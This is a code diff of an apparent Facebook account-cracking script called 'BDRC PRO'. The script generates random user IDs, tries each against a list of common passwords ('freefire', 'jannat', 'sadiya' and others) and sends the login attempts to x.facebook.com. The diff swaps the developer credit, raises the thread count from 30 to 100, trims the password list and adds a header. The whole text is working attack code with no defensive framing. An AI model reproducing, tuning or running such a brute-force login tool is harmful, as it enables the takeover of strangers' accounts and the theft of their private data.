@@ -88,11 +88,11 @@ logo=(f"""
 \033[32;1m░░░██║░░░██║░░██║██║░╚██╗██████╦╝██║██║░░██║
 \033[32;1m░░░╚═╝░░░╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░╚═╝╚═╝░░╚═╝
 \033[32;1m--------------------------------------------
-\033[32;1m\033[1;37m[\033[1;32m×\033[1;37m]\033[32;1m DEVELOPER  \033[32;1m:\033[32;1m\033[32;1m  TAKBIR ISLAM
-\033[32;1m\033[1;37m[\033[1;32m×\033[1;37m]\033[32;1m GIT-HUB    \033[32;1m:\033[32;1m\033[32;1m  N1X4T-2-0
-\033[32;1m\033[1;37m[\033[1;32m×\033[1;37m]\033[32;1m FACEBOOK   \033[32;1m:\033[32;1m\033[32;1m  TAKBIR ISLAM
+\033[32;1m\033[1;37m[\033[1;32m×\033[1;37m]\033[32;1m DEVELOPER  \033[32;1m:\033[32;1m\033[32;1m  BIPUL KHAN
+\033[32;1m\033[1;37m[\033[1;32m×\033[1;37m]\033[32;1m GIT-HUB    \033[32;1m:\033[32;1m\033[32;1m  BIPUL-159
+\033[32;1m\033[1;37m[\033[1;32m×\033[1;37m]\033[32;1m FACEBOOK   \033[32;1m:\033[32;1m\033[32;1m  BIPUL KHAN
 \033[32;1m\033[1;37m[\033[1;32m×\033[1;37m]\033[32;1m TOOLS      \033[32;1m:\033[32;1m\033[32;1m  BDRC PRO
-\033[32;1m\033[1;37m[\033[1;32m×\033[1;37m]\033[32;1m VERSION    \033[32;1m:\033[32;1m\033[32;1m  0.0.2
+\033[32;1m\033[1;37m[\033[1;32m×\033[1;37m]\033[32;1m VERSION    \033[32;1m:\033[32;1m\033[32;1m  0.0.3
 \033[32;1m--------------------------------------------""")
 #------MAIN-MENU----#
 def o():
@@ -133,7 +133,7 @@ def MUHIBrndm():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(4))
         user.append(nmp)
-    with ThreadPool(max_workers=30) as MUHIB:
+    with ThreadPool(max_workers=100) as MUHIB:
         os.system('clear')
         print(logo)
         tl = str(len(user))
@@ -149,7 +149,7 @@ def MUHIBrndm():
         __muhib__('\033[38;5;46m--------------------------------------------')
         for guru in user:
             uid = tithie+tithiex+tithi+guru
-            pwx = [tithie+tithiex+tithi+guru,tithi+guru,tithiex+guru,tithie+tithiex+tithi,'freefire','@@###','@#@#@#','jannat','sadiya','tamanna','nusrat','lamiya']
+            pwx = [tithie+tithiex+tithi+guru,tithi+guru,tithiex+guru,tithie+tithiex+tithi,'freefire','@#@#@#','jannat','sadiya','tamanna','nusrat','lamiya']
             MUHIB.submit(rcrack1,uid,pwx,tl)
     print(f'{G}--------------------------------------')
     print(' [×] FINISHED ------\033[1;92mTOTAL OK : %s'%len(oks))
@@ -182,6 +182,7 @@ def rcrack1(uid,pwx,tl):
             "login":"Log In"}
             header_freefb = {'authority': 'x.facebook.com',
     'method':'GET',
+    'path': '/',
     'scheme':'https',   
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
     'accept-language': 'en-IN,en-US;q=0.9,en-GB;q=0.8,en;q=0.7',
